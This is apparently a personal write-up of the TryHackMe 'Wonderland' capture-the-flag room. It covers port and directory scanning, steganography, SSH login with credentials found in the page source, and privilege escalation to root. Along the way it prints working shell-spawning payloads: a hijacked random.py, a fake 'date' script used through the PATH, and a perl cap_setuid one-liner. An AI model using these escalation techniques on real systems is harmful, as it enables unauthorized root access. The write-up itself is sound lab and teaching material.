# Wonderland

These notes are from a challenge I did @[tryhackme](https://tryhackme.com) called [wonderland](https://tryhackme.com/room/wonderland).

## First Checks

Let's scan for open ports first:```nmap -sC -sV 10.10.28.31```

??? output "Nmap output"
   ``` txt
    Nmap scan report for 10.10.28.31
    Host is up (0.075s latency).
    Not shown: 998 closed ports
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey:
    |   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
    |   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
    |_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
    80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
    |_http-title: Follow the white rabbit.
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 19.20 seconds
   ```

Let's search for paths on the webpage on port 80:```gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.28.31:80```

??? output "Gobuster output"
   ``` txt
    Gobuster v3.1.0
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://10.10.28.31:80
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.1.0
    [+] Timeout:                 10s
    ===============================================================
    2021/10/21 16:46:38 Starting gobuster in directory enumeration mode
    ===============================================================
    /img                  (Status: 301) [Size: 0] [--> img/]
    /r                    (Status: 301) [Size: 0] [--> r/]
    /poem                 (Status: 301) [Size: 0] [--> poem/]
   ```

## Steganography

Looking at <http://10.10.28.31/img/> we see the following files:

- alice_door.jpg
- alice_door.png
- white_rabbit_1.jpg

Let's download them all:

``` sh
wget http://10.10.28.31/img/alice_door.jpg
wget http://10.10.28.31/img/alice_door.png
wget http://10.10.28.31/img/white_rabbit_1.jpg
```

and run steghide...

Unfortunately `alice_door.jpg` and `alice_door.png` don't show any result (at least not without a passphrase...) but `white_rabbit_1.jpg` seems promissing:

``` sh
steghide extract -sf white_rabbit_1.jpg -p ''

the file "hint.txt" does already exist. overwrite ? (y/n) y
wrote extracted data to "hint.txt".
cat hint.txt
follow the r a b b i t
```

The hint means to follow this path: <http://10.10.28.31/r/a/b/b/i/t/>

Viewing the HTML code we see:

``` html
<p style="display: none;">alice:HowDothTheLittleCrocodileImproveHisShiningTail</p>
```

## Login as alice

Let's try to login using those credentials: `ssh alice@10.10.28.31`

??? output "ssh login"
   ``` txt
    Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

    * Documentation:  https://help.ubuntu.com
    * Management:     https://landscape.canonical.com
    * Support:        https://ubuntu.com/advantage

    System information as of Thu Oct 21 19:14:20 UTC 2021

    System load:  0.0                Processes:           85
    Usage of /:   18.9% of 19.56GB   Users logged in:     0
    Memory usage: 31%                IP address for eth0: 10.10.28.31
    Swap usage:   0%

    0 packages can be updated.
    0 updates are security updates.

    Last login: Mon May 25 16:37:21 2020 from 192.168.170.1
   ```

It is strange to see root.txt in the folder of alice.```find ./ -type f -iname "user.txt"``` doesn't reveal anything. The hint "Everything is upside down here." means if root.txt is here, maybe user.txt is under /root. We can directly read user.txt by running```cat /root/user.txt```. lol...

## Escalate privileges to rabbit

We see `walrus_and_the_carpenter.py` imports and calls `random` to get 10 random lines from the alice in wonderland lyrics stored in the file:

``` py
import random
[...]
for i in range(10):
    line = random.choice(poem.split("\n"))
    print("The line was:\t", line)a
```

Running `sudo -l` shows we can run `walrus_and_the_carpenter.py` as rabbit:

??? output "ssh login"
   ``` txt
    Matching Defaults entries for alice on wonderland:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User alice may run the following commands on wonderland:
        (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
   ```

To escalate privileges we can misuse the fact that we can run `walrus_and_the_carpenter.py` by creating our own `random.py` with the following content to overwrite the random function imported and called in `walrus_and_the_carpenter.py`

``` py
import os

def choice(argument):
    os.system("/bin/bash")
```

Running `walrus_and_the_carpenter.py` with our `random.py` will now give us prompt as rabbit:

``` sh
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

## Tea Party

As rabbit we see the following files in home:

``` txt
drwxr-x--- 2 rabbit rabbit  4096 May 25  2020 .
drwxr-xr-x 6 root   root    4096 May 25  2020 ..
lrwxrwxrwx 1 root   root       9 May 25  2020 .bash_history -> /dev/null
-rw-r--r-- 1 rabbit rabbit   220 May 25  2020 .bash_logout
-rw-r--r-- 1 rabbit rabbit  3771 May 25  2020 .bashrc
-rw-r--r-- 1 rabbit rabbit   807 May 25  2020 .profile
-rwsr-sr-x 1 root   root   16816 May 25  2020 teaParty
```

Running teaParty we get the following:

``` txt
rabbit@wonderland:/home/rabbit$ ./teaParty
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Thu, 21 Oct 2021 20:39:50 +0000
Ask very nicely, and I will give you some tea while you wait for him
```

Let's copy `teaParty` to the kali machine and view it in detail with `strings teaParty`:

??? output "strings teaParty"
    Serving teaParty to my kali machine

   ``` txt
    python3 -m http.server
    Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
    10.9.193.173 - - [21/Oct/2021 19:59:25] "GET /teaParty HTTP/1.1" 200 -
   ```

    Downloading teaParty file

   ``` txt
    wget 10.10.28.31:8000/teaParty
    --2021-10-21 15:59:24--  http://10.10.28.31:8000/teaParty
    Connecting to 10.10.28.31:8000... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 16816 (16K) [application/octet-stream]
    Saving to: ‘teaParty’

    teaParty                   100%[========================================>]  16.42K  --.-KB/s    in 0.02s

    2021-10-21 15:59:24 (895 KB/s) - ‘teaParty’ saved [16816/16816]
   ```

    Run```strings teaParty```

   ``` txt
    /lib64/ld-linux-x86-64.so.2
    2U~4
    libc.so.6
    setuid
    puts
    getchar
    system
    __cxa_finalize
    setgid
    __libc_start_main
    GLIBC_2.2.5
    _ITM_deregisterTMCloneTable
    __gmon_start__
    _ITM_registerTMCloneTable
    u/UH
    []A\A]A^A_
    Welcome to the tea party!
    The Mad Hatter will be here soon.
    /bin/echo -n 'Probably by ' && date --date='next hour' -R
    Ask very nicely, and I will give you some tea while you wait for him
    Segmentation fault (core dumped)
    ;*3$"
    GCC: (Debian 8.3.0-6) 8.3.0
    crtstuff.c
    deregister_tm_clones
    __do_global_dtors_aux
    completed.7325
    __do_global_dtors_aux_fini_array_entry
    frame_dummy
    __frame_dummy_init_array_entry
    teaParty.c
    __FRAME_END__
    __init_array_end
    _DYNAMIC
    __init_array_start
    __GNU_EH_FRAME_HDR
    _GLOBAL_OFFSET_TABLE_
    __libc_csu_fini
    _ITM_deregisterTMCloneTable
    puts@@GLIBC_2.2.5
    _edata
    system@@GLIBC_2.2.5
    __libc_start_main@@GLIBC_2.2.5
    __data_start
    getchar@@GLIBC_2.2.5
    __gmon_start__
    __dso_handle
    _IO_stdin_used
    __libc_csu_init
    __bss_start
    main
    setgid@@GLIBC_2.2.5
    __TMC_END__
    _ITM_registerTMCloneTable
    setuid@@GLIBC_2.2.5
    __cxa_finalize@@GLIBC_2.2.5
    .symtab
    .strtab
    .shstrtab
    .interp
    .note.ABI-tag
    .note.gnu.build-id
    .gnu.hash
    .dynsym
    .dynstr
    .gnu.version
    .gnu.version_r
    .rela.dyn
    .rela.plt
    .init
    .plt.got
    .text
    .fini
    .rodata
    .eh_frame_hdr
    .eh_frame
    .init_array
    .fini_array
    .dynamic
    .got.plt
    .data
    .bss
    .comment
   ```

We see the program calls `date` in this line:```/bin/echo -n 'Probably by ' && date --date='next hour' -R```. Just like with "random" from above, let's create our own `date` file e.g.:

``` sh
#!/bin/sh
bash
```

Now, let's change the file to be executable by everyone:```chmod +x date``` and add it to the path variables:```PATH=/home/rabbit:$PATH```

If we now execute `./teaParty` we get a shell as hatter:

``` txt
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by hatter@wonderland:/home/rabbit$
```

We can see the hatter password in `/home/hatter/password.txt`

## Login as hatter

Since we have the user name and password, let' us login with ssh:```ssh hatter@10.10.28.31```

`sudo -l`, `find / -perm -u=s -type f 2>/dev/null` and `find / -xdev -user hatter 2>/dev/null` don't reveal any interesting output but `find / -xdev -group hatter 2>/dev/null` shows group hatter owns perl. Unfortunately sudo is not possible and the suid bit isn’t set on the perl executable.

There is another thing we can check: With `getcap -r / 2>/dev/null` we can check for "capabilities" and we see perl in the list:

``` txt
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
```

Let's run a perl script misusing the capabilities from [GTOBins](https://gtfobins.github.io/gtfobins/perl/#capabilities): "If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID."

```perl
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

We are now root and can read the root.txt in the home folder of alice:

``` sh
cat /home/alice/root.txt
```
